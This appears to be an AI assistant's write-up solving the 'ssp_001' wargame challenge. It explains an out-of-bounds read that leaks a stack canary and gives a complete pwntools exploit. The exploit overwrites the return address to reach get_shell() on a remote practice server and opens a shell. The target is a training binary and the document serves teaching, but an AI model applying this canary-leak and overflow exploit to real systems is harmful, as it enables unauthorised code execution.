> ### A
> Wargame Exploit Solution  
> 3m 25s 동안 생각

Below is an example Python exploit script using the `pwntools` library. It demonstrates the general approach to solving the given challenge. The steps followed are:

1. Analyze the given code to find the vulnerability.
   - The program provides a stack canary and uses `scanf` and `read`. It is protected by a stack canary and NX.
   - We have two main functionalities:
     - **Fill the box (F)**: Allows writing 64 bytes into `box`.
     - **Print the box (P)**: Allows printing a single byte from `box` at a user-chosen index. There's no boundary check, so we can read out-of-bounds and leak the stack canary.
     - **Exit (E)**: Asks for "Name Size" and then reads that many bytes into `name`. Since we control the size, we can overflow past the `name` buffer, overwrite the canary, saved EBP, and return address if we know the canary. This lets us redirect execution to `get_shell()`.

2. Determine variable layout on the stack:
   The local variables in `main()` are defined as:
   ```c
   unsigned char box[0x40];  // 64 bytes
   char name[0x40];          // 64 bytes
   char select[2];           // 2 bytes
   int idx;                  // 4 bytes
   int name_len;             // 4 bytes
   // Then the stack canary is placed after all local variables, followed by saved EBP and return address.
   ```
   
   The stack layout (indexing from `box[0]` as index 0) would be approximately:
   - `box`: indices 0 ~ 63
   - `name`: indices 64 ~ 127
   - `select`: indices 128 ~ 129
   - 2-byte padding: indices 130 ~ 131 (for alignment)
   - `idx`: indices 132 ~ 135
   - `name_len`: indices 136 ~ 139
   - Canary: indices 140 ~ 143
   - Saved EBP: indices 144 ~ 147
   - Return Address: indices 148 ~ 151
   
   Thus, we can leak the canary by repeatedly using `P` with `idx` >= 140.

3. Leak the canary:
   - Use the `[P]rint the box` option with `idx` = 140, 141, 142, 143 to read the 4-byte canary.

4. Overwrite return address:
   - Use `[E]xit` option to provide a large `name_len` and write:
     `padding (76 bytes) + canary (4 bytes) + dummy EBP (4 bytes) + address of get_shell()`
   
   Address of `get_shell()` can be found by examining the binary (e.g., `objdump -d ssp_001 | grep get_shell`). Let's assume `get_shell()` is at `0x080485b6`.

5. After triggering the exploit, we get a shell. Then simply `cat flag`.

**Note**: You need the actual binary offsets for `get_shell()`. The offset provided (`0x080485b6`) is based on the code snippet and typical compilation. Adjust as needed after analyzing the binary locally.

---

### Exploit Code (pwntools)

```python
from pwn import *

# Set up context
context.binary = ELF('./ssp_001')
p = remote("host3.dreamhack.games", 21567)
elf = context.binary

# Function to interact with the menu
def menu_select(choice):
    p.sendlineafter('> ', choice)

# Leak the stack using print option
def print_box(idx):
    menu_select('P')
    p.sendlineafter("Element index : ", str(idx))
    p.recvuntil("is : ")
    return p.recvline().strip()

# Fill the box (not strictly necessary for leaking, but we can do it)
def fill_box(data):
    menu_select('F')
    p.sendafter("box input : ", data)

# Exit and trigger the overflow
def exit_with_name(size, payload):
    menu_select('E')
    p.sendlineafter("Name Size : ", str(size))
    p.sendafter("Name : ", payload)

# -----------------------------------------------------
# Step 1: Leak the canary
#
# According to our analysis, canary starts at index 140 relative to box.
# print_box() prints one byte at a time in hex format.
# We'll read canary bytes from index 140 to 143.

canary_bytes = b''
for i in range(140, 144):
    line = print_box(i)
    # line is something like 'xx' where xx is hex
    canary_bytes += bytes.fromhex(line.decode())

canary = u32(canary_bytes)
log.info("Leaked canary: 0x{:08x}".format(canary))

# -----------------------------------------------------
# Step 2: Overwrite return address
#
# Calculate offsets:
# From name buffer start to canary:
# name starts at index 64, canary at index 140, difference = 76 bytes
#
# Payload layout:
# [76 bytes padding][canary][4 bytes fake EBP][return address = get_shell]

get_shell_addr = elf.symbols['get_shell']
log.info("get_shell address: 0x{:08x}".format(get_shell_addr))

payload = b'A' * 76
payload += p32(canary)
payload += b'B'*4  # fake saved EBP
payload += p32(get_shell_addr)

# Trigger overflow via 'E'
exit_with_name(200, payload)

# If successful, we should have a shell now.
p.interactive()
```

**What this script does:**
- Connects to the remote service.
- Uses the `P` option to leak the canary by reading out-of-bounds from the stack.
- Prepares a payload that overwrites the canary correctly, the saved EBP, and the return address with `get_shell()` function.
- Sends the payload through the `E` option to overflow `name`.
- Drops into an interactive shell, allowing you to run `cat flag`.

Remember to adjust addresses if needed after examining the actual binary. Once you have the shell, simply run `cat flag` to retrieve the flag.